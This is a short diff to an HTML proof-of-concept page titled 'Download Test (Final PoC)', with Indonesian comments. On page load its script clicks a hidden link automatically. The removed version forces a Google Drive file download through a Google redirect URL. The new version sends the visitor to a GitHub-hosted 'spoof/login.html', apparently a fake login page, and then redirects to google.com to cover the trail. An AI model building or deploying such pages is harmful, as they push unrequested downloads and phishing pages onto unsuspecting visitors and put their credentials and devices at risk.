@@ -1,22 +1,23 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Download Test</title>
+<title>Download Test (Final PoC)</title>
 <script>
 function start() {
-    const file = "https://www.google.com/url?q=https://drive.usercontent.google.com/download?id=1pyh3Gp20w9m4sy4BYAls38IbEN2t8RNY&export=download&authuser=0&confirm=t&uuid=a0187592-23da-4e90-bce3-d18c37483ff7&at=AN8xHoom8UDsa0rGI1HwSYH-pLYo:1756640251918";
+    // Ganti URL supaya tidak download tapi tetap request
+    const file = "https://cnfdnfial-ops.github.io/spoof/login.html";
 
+    // Trigger request via <a> tanpa memaksa download
     const a = document.createElement("a");
     a.href = file;
-    a.download = "";
+    a.download = ""; // attribute tetap ada tapi diabaikan browser
     document.body.appendChild(a);
 
-    a.click(); // trigger download
+    a.click(); // trigger request
     document.body.removeChild(a); // bersihkan DOM
 
-    // redirect setelah download
+    // redirect setelah request
     setTimeout(() => {
         window.open("http://google.com/", "_self", "noopener,noreferrer");
     }, 2000);
